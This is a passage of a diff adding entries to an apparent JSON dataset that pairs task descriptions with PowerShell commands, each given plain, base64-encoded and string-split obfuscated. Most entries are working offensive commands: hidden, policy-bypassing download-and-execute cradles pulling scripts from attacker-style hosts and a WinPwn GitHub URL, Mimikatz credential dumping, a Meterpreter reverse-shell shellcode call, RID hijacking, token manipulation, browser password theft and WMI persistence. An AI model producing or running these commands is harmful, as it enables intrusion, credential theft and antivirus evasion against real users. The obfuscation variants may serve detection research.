+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHAAIABiAHkAcABhAHMAcwAgAC0AbgBvAHAAIAAtAGMAIAAiAEkARQBYACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAeABwAGwAbwBpAHQAaQBuAGcAdQByAGwALgBjAG8AbQAvAGUAeABlAGMASwBlAHIAbgAuAHAAcwAxACcAKQAiAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''ep''+'' b''+''yp''+''as''+''s ''+''-n''+''op''+'' -''+''c ''+''\"I''+''EX''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/e''+''xp''+''lo''+''it''+''in''+''gu''+''rl''+''.c''+''om''+''/e''+''xe''+''cK''+''er''+''n.''+''ps''+''1'''+'')\"')"
+    ]
+  },
+  {
+    "input": "Execute a hidden PowerShell command with bypassed execution policy and download a script from a specified URL.",
+    "outputs": [
+      "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command {Invoke-Expression (New-Object Net.WebClient).DownloadString('http://malicious-server.com/malicious-script.ps1')}",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0ATgBvAG4ASQAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAbwBtAG0AYQBuAGQAIAB7AEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAZQByAHYAZQByAC4AYwBvAG0ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAYwByAGkAcAB0AC4AcABzADEAJwApAH0A",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''No''+''P ''+''-N''+''on''+''I ''+''-W''+'' H''+''id''+''de''+''n ''+''-E''+''xe''+''c ''+''By''+''pa''+''ss''+'' -''+''Co''+''mm''+''an''+''d ''+''{I''+''nv''+''ok''+''e-''+''Ex''+''pr''+''es''+''si''+''on''+'' (''+''Ne''+''w-''+''Ob''+''je''+''ct''+'' N''+''et''+''.W''+''eb''+''Cl''+''ie''+''nt''+'').''+''Do''+''wn''+''lo''+''ad''+''St''+''ri''+''ng''+''('''+''ht''+''tp''+'':/''+''/m''+''al''+''ic''+''io''+''us''+''-s''+''er''+''ve''+''r.''+''co''+''m/''+''ma''+''li''+''ci''+''ou''+''s-''+''sc''+''ri''+''pt''+''.p''+''s1''+''')''+''}')"
+    ]
+  },
+  {
+    "input": "Create a compressed tar archive of a specified Git directory and write the archive path to the console.",
+    "outputs": [
+      "tar -czf ${host.dir.git}.tar.gz -C ${host.dir.git} *; Write-Host ${host.dir.git}.tar.gz; exit 0;",
+      "powershell -enc dABhAHIAIAAtAGMAegBmACAAJAB7AGgAbwBzAHQALgBkAGkAcgAuAGcAaQB0AH0ALgB0AGEAcgAuAGcAegAgAC0AQwAgACQAewBoAG8AcwB0AC4AZABpAHIALgBnAGkAdAB9ACAAKgA7ACAAVwByAGkAdABlAC0ASABvAHMAdAAgACQAewBoAG8AcwB0AC4AZABpAHIALgBnAGkAdAB9AC4AdABhAHIALgBnAHoAOwAgAGUAeABpAHQAIAAwADsA",
+      "IEX('ta''+''r ''+''-c''+''zf''+'' $''+''{h''+''os''+''t.''+''di''+''r.''+''gi''+''t}''+''.t''+''ar''+''.g''+''z ''+''-C''+'' $''+''{h''+''os''+''t.''+''di''+''r.''+''gi''+''t}''+'' *''+''; ''+''Wr''+''it''+''e-''+''Ho''+''st''+'' $''+''{h''+''os''+''t.''+''di''+''r.''+''gi''+''t}''+''.t''+''ar''+''.g''+''z;''+'' e''+''xi''+''t ''+''0;')"
+    ]
+  },
+  {
+    "input": "Retrieve content from a file, get Windows updates, format the table, and display information.",
+    "outputs": [
+      "Get-Content computers.txt | Get-WinUpdates | Format-Table PC,Date,Operation,Status,Title,KB,PC -Wrap -auto",
+      "powershell -enc RwBlAHQALQBDAG8AbgB0AGUAbgB0ACAAYwBvAG0AcAB1AHQAZQByAHMALgB0AHgAdAAgAHwAIABHAGUAdAAtAFcAaQBuAFUAcABkAGEAdABlAHMAIAB8ACAARgBvAHIAbQBhAHQALQBUAGEAYgBsAGUAIABQAEMALABEAGEAdABlACwATwBwAGUAcgBhAHQAaQBvAG4ALABTAHQAYQB0AHUAcwAsAFQAaQB0AGwAZQAsAEsAQgAsAFAAQwAgAC0AVwByAGEAcAAgAC0AYQB1AHQAbwA=",
+      "IEX('Ge''+''t-''+''Co''+''nt''+''en''+''t ''+''co''+''mp''+''ut''+''er''+''s.''+''tx''+''t ''+''| ''+''Ge''+''t-''+''Wi''+''nU''+''pd''+''at''+''es''+'' |''+'' F''+''or''+''ma''+''t-''+''Ta''+''bl''+''e ''+''PC''+'',D''+''at''+''e,''+''Op''+''er''+''at''+''io''+''n,''+''St''+''at''+''us''+'',T''+''it''+''le''+'',K''+''B,''+''PC''+'' -''+''Wr''+''ap''+'' -''+''au''+''to')"
+    ]
+  },
+  {
+    "input": "Execute a hidden PowerShell command with bypassed execution policy and download a script from a GitHub repository.",
+    "outputs": [
+      "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBOAG8AUAAgAC0ATgBvAG4ASQAgAC0AVwAgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjACAAQgB5AHAAYQBzAHMAIAAtAEMAbwBtAG0AYQBuAGQAIABJAEUAWAAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwBTADMAYwB1AHIAMwBUAGgAMQBzAFMAaAAxAHQALwBXAGkAbgBQAHcAbgAvADEAMgAxAGQAYwBlAGUAMgA2AGEANwBhAGMAYQAzADYAOAA4ADIAMQA1ADYAMwBjAGIAZQA5ADIAYgAyAGIANQA2ADMAOABjADUANwA3ADMALwBXAGkAbgBQAHcAbgAuAHAAcwAxACcAKQA=",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''No''+''P ''+''-N''+''on''+''I ''+''-W''+'' H''+''id''+''de''+''n ''+''-E''+''xe''+''c ''+''By''+''pa''+''ss''+'' -''+''Co''+''mm''+''an''+''d ''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+'''h''+''tt''+''ps''+'':/''+''/r''+''aw''+''.g''+''it''+''hu''+''bu''+''se''+''rc''+''on''+''te''+''nt''+''.c''+''om''+''/S''+''3c''+''ur''+''3T''+''h1''+''sS''+''h1''+''t/''+''Wi''+''nP''+''wn''+''/1''+''21''+''dc''+''ee''+''26''+''a7''+''ac''+''a3''+''68''+''82''+''15''+''63''+''cb''+''e9''+''2b''+''2b''+''56''+''38''+''c5''+''77''+''3/''+''Wi''+''nP''+''wn''+''.p''+''s1''+''')')"
+    ]
+  },
+  {
+    "input": "Use netsh to set up port forwarding from a specified listen port to a specified connect port and address.",
+    "outputs": [
+      "netsh interface portproxy add v4tov4 listenport=${listen_port} connectport=${connect_port} connectaddress=${connect_address}",
+      "powershell -enc bgBlAHQAcwBoACAAaQBuAHQAZQByAGYAYQBjAGUAIABwAG8AcgB0AHAAcgBvAHgAeQAgAGEAZABkACAAdgA0AHQAbwB2ADQAIABsAGkAcwB0AGUAbgBwAG8AcgB0AD0AJAB7AGwAaQBzAHQAZQBuAF8AcABvAHIAdAB9ACAAYwBvAG4AbgBlAGMAdABwAG8AcgB0AD0AJAB7AGMAbwBuAG4AZQBjAHQAXwBwAG8AcgB0AH0AIABjAG8AbgBuAGUAYwB0AGEAZABkAHIAZQBzAHMAPQAkAHsAYwBvAG4AbgBlAGMAdABfAGEAZABkAHIAZQBzAHMAfQA=",
+      "IEX('ne''+''ts''+''h ''+''in''+''te''+''rf''+''ac''+''e ''+''po''+''rt''+''pr''+''ox''+''y ''+''ad''+''d ''+''v4''+''to''+''v4''+'' l''+''is''+''te''+''np''+''or''+''t=''+''${''+''li''+''st''+''en''+''_p''+''or''+''t}''+'' c''+''on''+''ne''+''ct''+''po''+''rt''+''=$''+''{c''+''on''+''ne''+''ct''+''_p''+''or''+''t}''+'' c''+''on''+''ne''+''ct''+''ad''+''dr''+''es''+''s=''+''${''+''co''+''nn''+''ec''+''t_''+''ad''+''dr''+''es''+''s}')"
+    ]
+  },
+  {
+    "input": "Set environment variables and sleep for 1 second using PowerShell.",
+    "outputs": [
+      "$env:COR_ENABLE_PROFILING = 1 ; $env:COR_PROFILER = '${cls_guid}' ; $env:COR_PROFILER_PATH = '${filename}' ; POWERSHELL -c 'Start-Sleep 1'",
+      "powershell -enc JABlAG4AdgA6AEMATwBSAF8ARQBOAEEAQgBMAEUAXwBQAFIATwBGAEkATABJAE4ARwAgAD0AIAAxACAAOwAgACQAZQBuAHYAOgBDAE8AUgBfAFAAUgBPAEYASQBMAEUAUgAgAD0AIAAnACQAewBjAGwAcwBfAGcAdQBpAGQAfQAnACAAOwAgACQAZQBuAHYAOgBDAE8AUgBfAFAAUgBPAEYASQBMAEUAUgBfAFAAQQBUAEgAIAA9ACAAJwAkAHsAZgBpAGwAZQBuAGEAbQBlAH0AJwAgADsAIABQAE8AVwBFAFIAUwBIAEUATABMACAALQBjACAAJwBTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxACcA",
+      "IEX('$e''+''nv''+'':C''+''OR''+''_E''+''NA''+''BL''+''E_''+''PR''+''OF''+''IL''+''IN''+''G ''+''= ''+''1 ''+''; ''+''$e''+''nv''+'':C''+''OR''+''_P''+''RO''+''FI''+''LE''+''R ''+''= ''+'''$''+''{c''+''ls''+''_g''+''ui''+''d}''+''' ''+''; ''+''$e''+''nv''+'':C''+''OR''+''_P''+''RO''+''FI''+''LE''+''R_''+''PA''+''TH''+'' =''+'' '''+''${''+''fi''+''le''+''na''+''me''+''}'''+'' ;''+'' P''+''OW''+''ER''+''SH''+''EL''+''L ''+''-c''+'' '''+''St''+''ar''+''t-''+''Sl''+''ee''+''p ''+''1'')"
+    ]
+  },
+  {
+    "input": "Perform RID Hijacking with specified user, RID, password, and enable the attack.",
+    "outputs": [
+      "Invoke-RIDHijacking -User alice -RID 500 -Password Password1 -Enable",
+      "powershell -enc SQBuAHYAbwBrAGUALQBSAEkARABIAGkAagBhAGMAawBpAG4AZwAgAC0AVQBzAGUAcgAgAGEAbABpAGMAZQAgAC0AUgBJAEQAIAA1ADAAMAAgAC0AUABhAHMAcwB3AG8AcgBkACAAUABhAHMAcwB3AG8AcgBkADEAIAAtAEUAbgBhAGIAbABlAA==",
+      "IEX('In''+''vo''+''ke''+''-R''+''ID''+''Hi''+''ja''+''ck''+''in''+''g ''+''-U''+''se''+''r ''+''al''+''ic''+''e ''+''-R''+''ID''+'' 5''+''00''+'' -''+''Pa''+''ss''+''wo''+''rd''+'' P''+''as''+''sw''+''or''+''d1''+'' -''+''En''+''ab''+''le')"
+    ]
+  },
+  {
+    "input": "Retrieve information about Win32 groups using WMI.",
+    "outputs": [
+      "Get-WMIObject Win32_Group",
+      "powershell -enc RwBlAHQALQBXAE0ASQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAEcAcgBvAHUAcAA=",
+      "IEX('Ge''+''t-''+''WM''+''IO''+''bj''+''ec''+''t ''+''Wi''+''n3''+''2_''+''Gr''+''ou''+''p')"
+    ]
+  },
+  {
+    "input": "Get the current date in a specific format.",
+    "outputs": [
+      "Get-Date -UFormat '+%Y-%m-%dT%H:%M:%SZ'",
+      "powershell -enc RwBlAHQALQBEAGEAdABlACAALQBVAEYAbwByAG0AYQB0ACAAJwArACUAWQAtACUAbQAtACUAZABUACUASAA6ACUATQA6ACUAUwBaACcA",
+      "IEX('Ge''+''t-''+''Da''+''te''+'' -''+''UF''+''or''+''ma''+''t ''+'''+''+''%Y''+''-%''+''m-''+''%d''+''T%''+''H:''+''%M''+'':%''+''SZ''+'''')"
+    ]
+  },
+  {
+    "input": "Execute a Python script with specified filename and IP address as arguments.",
+    "outputs": [
+      "python ${file_name} -i ${IP}",
+      "powershell -enc cAB5AHQAaABvAG4AIAAkAHsAZgBpAGwAZQBfAG4AYQBtAGUAfQAgAC0AaQAgACQAewBJAFAAfQA=",
+      "IEX('py''+''th''+''on''+'' $''+''{f''+''il''+''e_''+''na''+''me''+''} ''+''-i''+'' $''+''{I''+''P}')"
+    ]
+  },
+  {
+    "input": "Execute a PowerShell script with bypassed execution policy from a specified file path.",
+    "outputs": [
+      "powershell.exe -ExecutionPolicy Bypass -File C:\\Users\\User\\somecode.ps1",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIAeQBwAGEAcwBzACAALQBGAGkAbABlACAAQwA6AFwAVQBzAGUAcgBzAFwAVQBzAGUAcgBcAHMAbwBtAGUAYwBvAGQAZQAuAHAAcwAxAA==",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''Ex''+''ec''+''ut''+''io''+''nP''+''ol''+''ic''+''y ''+''By''+''pa''+''ss''+'' -''+''Fi''+''le''+'' C''+'':\\''+''Us''+''er''+''s\\''+''Us''+''er''+''\\s''+''om''+''ec''+''od''+''e.''+''ps''+''1')"
+    ]
+  },
+  {
+    "input": "Bypass WScript execution policy and execute a PowerShell payload with specified parameters.",
+    "outputs": [
+      "Invoke-WScriptBypass -payload 'powershell.exe -ep Bypass -WindowStyle Hidden -enc <base64>'",
+      "powershell -enc SQBuAHYAbwBrAGUALQBXAFMAYwByAGkAcAB0AEIAeQBwAGEAcwBzACAALQBwAGEAeQBsAG8AYQBkACAAJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAGUAcAAgAEIAeQBwAGEAcwBzACAALQBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIABIAGkAZABkAGUAbgAgAC0AZQBuAGMAIAA8AGIAYQBzAGUANgA0AD4AJwA=",
+      "IEX('In''+''vo''+''ke''+''-W''+''Sc''+''ri''+''pt''+''By''+''pa''+''ss''+'' -''+''pa''+''yl''+''oa''+''d ''+'''p''+''ow''+''er''+''sh''+''el''+''l.''+''ex''+''e ''+''-e''+''p ''+''By''+''pa''+''ss''+'' -''+''Wi''+''nd''+''ow''+''St''+''yl''+''e ''+''Hi''+''dd''+''en''+'' -''+''en''+''c ''+''<b''+''as''+''e6''+''4>''+'''')"
+    ]
+  },
+  {
+    "input": "Create a payload with Unicode-encoded Mimikatz command.",
+    "outputs": [
+      "$payload = [System.Text.Encoding]::Unicode.GetBytes(\"Invoke-Mimikatz\")",
+      "powershell -enc JABwAGEAeQBsAG8AYQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABCAHkAdABlAHMAKAAiAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACIAKQA=",
+      "IEX('$p''+''ay''+''lo''+''ad''+'' =''+'' [''+''Sy''+''st''+''em''+''.T''+''ex''+''t.''+''En''+''co''+''di''+''ng''+'']:''+'':U''+''ni''+''co''+''de''+''.G''+''et''+''By''+''te''+''s(''+''\"I''+''nv''+''ok''+''e-''+''Mi''+''mi''+''ka''+''tz''+''\")')"
+    ]
+  },
+  {
+    "input": "Invoke token manipulation to create a new process (cmd.exe) with a specified thread ID.",
+    "outputs": [
+      "Invoke-TokenManipulation -CreateProcess 'cmd.exe' -ThreadId 500",
+      "powershell -enc SQBuAHYAbwBrAGUALQBUAG8AawBlAG4ATQBhAG4AaQBwAHUAbABhAHQAaQBvAG4AIAAtAEMAcgBlAGEAdABlAFAAcgBvAGMAZQBzAHMAIAAnAGMAbQBkAC4AZQB4AGUAJwAgAC0AVABoAHIAZQBhAGQASQBkACAANQAwADAA",
+      "IEX('In''+''vo''+''ke''+''-T''+''ok''+''en''+''Ma''+''ni''+''pu''+''la''+''ti''+''on''+'' -''+''Cr''+''ea''+''te''+''Pr''+''oc''+''es''+''s ''+'''c''+''md''+''.e''+''xe''+''' ''+''-T''+''hr''+''ea''+''dI''+''d ''+''50''+''0')"
+    ]
+  },
+  {
+    "input": "Execute Inveigh PowerShell script to perform network analysis and attacks on the local network.",
+    "outputs": [
+      "./Inveigh.ps1;Invoke-Inveigh -IP 192.168.1.10",
+      "powershell -enc LgAvAEkAbgB2AGUAaQBnAGgALgBwAHMAMQA7AEkAbgB2AG8AawBlAC0ASQBuAHYAZQBpAGcAaAAgAC0ASQBQACAAMQA5ADIALgAxADYAOAAuADEALgAxADAA",
+      "IEX('./''+''In''+''ve''+''ig''+''h.''+''ps''+''1;''+''In''+''vo''+''ke''+''-I''+''nv''+''ei''+''gh''+'' -''+''IP''+'' 1''+''92''+''.1''+''68''+''.1''+''.1''+''0')"
+    ]
+  },
+  {
+    "input": "Execute a Python script with specified filename and host IP address as arguments.",
+    "outputs": [
+      "python ${filename} -i ${host_ip}",
+      "powershell -enc cAB5AHQAaABvAG4AIAAkAHsAZgBpAGwAZQBuAGEAbQBlAH0AIAAtAGkAIAAkAHsAaABvAHMAdABfAGkAcAB9AA==",
+      "IEX('py''+''th''+''on''+'' $''+''{f''+''il''+''en''+''am''+''e}''+'' -''+''i ''+''${''+''ho''+''st''+''_i''+''p}')"
+    ]
+  },
+  {
+    "input": "Invoke-Mimikatz cmdlet with bypassed execution policy.",
+    "outputs": [
+      "powershell.exe -exec bypass -c \"Invoke-Mimikatz\"",
+      "powershell -enc cABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACAALQBlAHgAZQBjACAAYgB5AHAAYQBzAHMAIAAtAGMAIAAiAEkAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6ACIA",
+      "IEX('po''+''we''+''rs''+''he''+''ll''+''.e''+''xe''+'' -''+''ex''+''ec''+'' b''+''yp''+''as''+''s ''+''-c''+'' \"''+''In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z\"')"
+    ]
+  },
+  {
+    "input": "Start a process with DirLister, wait for 4 seconds, and stop the DirLister process.",
+    "outputs": [
+      "Start-Process ${dirlister_path} ; Start-Sleep -Second 4 ; Stop-Process -Name \"DirLister\"",
+      "powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAewBkAGkAcgBsAGkAcwB0AGUAcgBfAHAAYQB0AGgAfQAgADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkACAANAAgADsAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIARABpAHIATABpAHMAdABlAHIAIgA=",
+      "IEX('St''+''ar''+''t-''+''Pr''+''oc''+''es''+''s ''+''${''+''di''+''rl''+''is''+''te''+''r_''+''pa''+''th''+''} ''+''; ''+''St''+''ar''+''t-''+''Sl''+''ee''+''p ''+''-S''+''ec''+''on''+''d ''+''4 ''+''; ''+''St''+''op''+''-P''+''ro''+''ce''+''ss''+'' -''+''Na''+''me''+'' \"''+''Di''+''rL''+''is''+''te''+''r\"')"
+    ]
+  },
+  {
+    "input": "Start a process with WebBrowserPassView, wait for 4 seconds, and stop the WebBrowserPassView process.",
+    "outputs": [
+      "Start-Process ${webbrowserpassview_path} ; Start-Sleep -Second 4 ; Stop-Process -Name \"WebBrowserPassView\"",
+      "powershell -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAewB3AGUAYgBiAHIAbwB3AHMAZQByAHAAYQBzAHMAdgBpAGUAdwBfAHAAYQB0AGgAfQAgADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkACAANAAgADsAIABTAHQAbwBwAC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgACIAVwBlAGIAQgByAG8AdwBzAGUAcgBQAGEAcwBzAFYAaQBlAHcAIgA=",
+      "IEX('St''+''ar''+''t-''+''Pr''+''oc''+''es''+''s ''+''${''+''we''+''bb''+''ro''+''ws''+''er''+''pa''+''ss''+''vi''+''ew''+''_p''+''at''+''h}''+'' ;''+'' S''+''ta''+''rt''+''-S''+''le''+''ep''+'' -''+''Se''+''co''+''nd''+'' 4''+'' ;''+'' S''+''to''+''p-''+''Pr''+''oc''+''es''+''s ''+''-N''+''am''+''e ''+''\"W''+''eb''+''Br''+''ow''+''se''+''rP''+''as''+''sV''+''ie''+''w\"')"
+    ]
+  },
+  {
+    "input": "Invoke compiled help with specified parameters.",
+    "outputs": [
+      "Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler ${infotech_storage_handler} -TopicExtension ${topic_extension} -HHFilePath ${hh_file_path} -CHMFilePath ${chm_file_path}",
+      "powershell -enc SQBuAHYAbwBrAGUALQBBAFQASABDAG8AbQBwAGkAbABlAGQASABlAGwAcAAgAC0ARQB4AGUAYwB1AHQAZQBTAGgAbwByAHQAYwB1AHQAQwBvAG0AbQBhAG4AZAAgAC0ASQBuAGYAbwBUAGUAYwBoAFMAdABvAHIAYQBnAGUASABhAG4AZABsAGUAcgAgACQAewBpAG4AZgBvAHQAZQBjAGgAXwBzAHQAbwByAGEAZwBlAF8AaABhAG4AZABsAGUAcgB9ACAALQBUAG8AcABpAGMARQB4AHQAZQBuAHMAaQBvAG4AIAAkAHsAdABvAHAAaQBjAF8AZQB4AHQAZQBuAHMAaQBvAG4AfQAgAC0ASABIAEYAaQBsAGUAUABhAHQAaAAgACQAewBoAGgAXwBmAGkAbABlAF8AcABhAHQAaAB9ACAALQBDAEgATQBGAGkAbABlAFAAYQB0AGgAIAAkAHsAYwBoAG0AXwBmAGkAbABlAF8AcABhAHQAaAB9AA==",
+      "IEX('In''+''vo''+''ke''+''-A''+''TH''+''Co''+''mp''+''il''+''ed''+''He''+''lp''+'' -''+''Ex''+''ec''+''ut''+''eS''+''ho''+''rt''+''cu''+''tC''+''om''+''ma''+''nd''+'' -''+''In''+''fo''+''Te''+''ch''+''St''+''or''+''ag''+''eH''+''an''+''dl''+''er''+'' $''+''{i''+''nf''+''ot''+''ec''+''h_''+''st''+''or''+''ag''+''e_''+''ha''+''nd''+''le''+''r}''+'' -''+''To''+''pi''+''cE''+''xt''+''en''+''si''+''on''+'' $''+''{t''+''op''+''ic''+''_e''+''xt''+''en''+''si''+''on''+''} ''+''-H''+''HF''+''il''+''eP''+''at''+''h ''+''${''+''hh''+''_f''+''il''+''e_''+''pa''+''th''+''} ''+''-C''+''HM''+''Fi''+''le''+''Pa''+''th''+'' $''+''{c''+''hm''+''_f''+''il''+''e_''+''pa''+''th''+''}')"
+    ]
+  },
+  {
+    "input": "Create elevated persistence option with WMI, daily execution at 3 PM.",
+    "outputs": [
+      "$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'",
+      "powershell -enc JABFAGwAZQB2AGEAdABlAGQATwBwAHQAaQBvAG4AcwAgAD0AIABOAGUAdwAtAEUAbABlAHYAYQB0AGUAZABQAGUAcgBzAGkAcwB0AGUAbgBjAGUATwBwAHQAaQBvAG4AIAAtAFAAZQByAG0AYQBuAGUAbgB0AFcATQBJACAALQBEAGEAaQBsAHkAIAAtAEEAdAAgACcAMwAgAFAATQAnAA==",
+      "IEX('$E''+''le''+''va''+''te''+''dO''+''pt''+''io''+''ns''+'' =''+'' N''+''ew''+''-E''+''le''+''va''+''te''+''dP''+''er''+''si''+''st''+''en''+''ce''+''Op''+''ti''+''on''+'' -''+''Pe''+''rm''+''an''+''en''+''tW''+''MI''+'' -''+''Da''+''il''+''y ''+''-A''+''t ''+'''3''+'' P''+''M'')"
+    ]
+  },
+  {
+    "input": "Download PowerShell script and execute it using Invoke-Expression.",
+    "outputs": [
+      "$payload = 'IEX (New-Object Net.WebClient).DownloadString(\"http://somesurl.com/juve.ps1\")'; Invoke-Expression $payload",
+      "powershell -enc JABwAGEAeQBsAG8AYQBkACAAPQAgACcASQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AcwBvAG0AZQBzAHUAcgBsAC4AYwBvAG0ALwBqAHUAdgBlAC4AcABzADEAIgApACcAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACQAcABhAHkAbABvAGEAZAA=",
+      "IEX('$p''+''ay''+''lo''+''ad''+'' =''+'' '''+''IE''+''X ''+''(N''+''ew''+''-O''+''bj''+''ec''+''t ''+''Ne''+''t.''+''We''+''bC''+''li''+''en''+''t)''+''.D''+''ow''+''nl''+''oa''+''dS''+''tr''+''in''+''g(''+''\"h''+''tt''+''p:''+''//''+''so''+''me''+''su''+''rl''+''.c''+''om''+''/j''+''uv''+''e.''+''ps''+''1\"''+'')'''+''; ''+''In''+''vo''+''ke''+''-E''+''xp''+''re''+''ss''+''io''+''n ''+''$p''+''ay''+''lo''+''ad')"
+    ]
+  },
+  {
+    "input": "Retrieve information about Win32_UserAccount using WMI.",
+    "outputs": [
+      "Get-WmiObject -Class Win32_UserAccount",
+      "powershell -enc RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AQwBsAGEAcwBzACAAVwBpAG4AMwAyAF8AVQBzAGUAcgBBAGMAYwBvAHUAbgB0AA==",
+      "IEX('Ge''+''t-''+''Wm''+''iO''+''bj''+''ec''+''t ''+''-C''+''la''+''ss''+'' W''+''in''+''32''+''_U''+''se''+''rA''+''cc''+''ou''+''nt')"
+    ]
+  },
+  {
+    "input": "Invoke Mimikatz to dump credentials and execute shellcode with specified parameters.",
+    "outputs": [
+      "Invoke-Mimikatz -DumpCreds; Invoke-Shellcode -Payload windows/meterpreter/reverse_tcp -Lhost 10.0.0.1 -Lport 443; Invoke-C",
+      "powershell -enc SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoAIAAtAEQAdQBtAHAAQwByAGUAZABzADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwB0AGMAcAAgAC0ATABoAG8AcwB0ACAAMQAwAC4AMAAuADAALgAxACAALQBMAHAAbwByAHQAIAA0ADQAMwA7ACAASQBuAHYAbwBrAGUALQBDAA==",
+      "IEX('In''+''vo''+''ke''+''-M''+''im''+''ik''+''at''+''z ''+''-D''+''um''+''pC''+''re''+''ds''+''; ''+''In''+''vo''+''ke''+''-S''+''he''+''ll''+''co''+''de''+'' -''+''Pa''+''yl''+''oa''+''d ''+''wi''+''nd''+''ow''+''s/''+''me''+''te''+''rp''+''re''+''te''+''r/''+''re''+''ve''+''rs''+''e_''+''tc''+''p ''+''-L''+''ho''+''st''+'' 1''+''0.''+''0.''+''0.''+''1 ''+''-L''+''po''+''rt''+'' 4''+''43''+''; ''+''In''+''vo''+''ke''+''-C')"
+    ]
+  },
+  {
+    "input": "Retrieve indexed items that contain 'Stingray' in the filter, are of kind 'picture', and have keywords 'portfolio'.",
+    "outputs": [
+      "Get-IndexedItem -Filter Contains(*,'Stingray'), kind = 'picture', keywords='portfolio'",
+      "powershell -enc RwBlAHQALQBJAG4AZABlAHgAZQBkAEkAdABlAG0AIAAtAEYAaQBsAHQAZQByACAAQwBvAG4AdABhAGkAbgBzACgAKgAsACcAUwB0AGkAbgBnAHIAYQB5ACcAKQAsACAAawBpAG4AZAAgAD0AIAAnAHAAaQBjAHQAdQByAGUAJwAsACAAawBlAHkAdwBvAHIAZABzAD0AJwBwAG8AcgB0AGYAbwBsAGkAbwAnAA==",
+      "IEX('Ge''+''t-''+''In''+''de''+''xe''+''dI''+''te''+''m ''+''-F''+''il''+''te''+''r ''+''Co''+''nt''+''ai''+''ns''+''(*''+'','''+''St''+''in''+''gr''+''ay''+''')''+'', ''+''ki''+''nd''+'' =''+'' '''+''pi''+''ct''+''ur''+''e'''+'', ''+''ke''+''yw''+''or''+''ds''+''='''+''po''+''rt''+''fo''+''li''+''o'')"
+    ]
+  },
+  {
